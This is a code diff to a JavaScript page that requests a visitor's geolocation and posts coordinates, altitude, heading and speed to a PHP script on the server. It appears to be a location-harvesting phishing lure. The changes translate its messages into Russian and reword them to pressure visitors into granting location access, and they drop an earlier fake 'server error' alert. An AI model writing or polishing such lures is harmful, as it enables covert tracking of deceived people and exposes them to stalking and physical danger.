@@ -23,10 +23,9 @@ function locate()
       type: 'POST',
       url: '/php/result.php',
       data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
-      success: function(){$('#change').html('Coming Soon');},
+      success: function(){$('#change').html('Пожалуйста, подождите...');},
       mimeType: 'text'
     });
-    alert('Ошибка сервера (500). К сожалению, в настоящее время сервис не доступен, попробуйте позже');
   };
 }
 
@@ -36,7 +35,7 @@ function showError(error)
   {
 		case error.PERMISSION_DENIED:
 			var denied = 'Пользователь отклонил запрос на геолокацию';
-      alert('Пожалуйста, обновите эту страницу и разрешите доступ к местоположению...');
+      alert('Для корректной работы сервиса необходимо подтвердить местоположение');
       break;
 		case error.POSITION_UNAVAILABLE:
 			var unavailable = 'Информация о местоположении недоступна';
@@ -54,7 +53,7 @@ function showError(error)
     type: 'POST',
     url: '/php/error.php',
     data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
-    success: function(){$('#change').html('Failed');},
+    success: function(){$('#change').html('Активируйте местоположение');},
     mimeType: 'text'
   });
 }
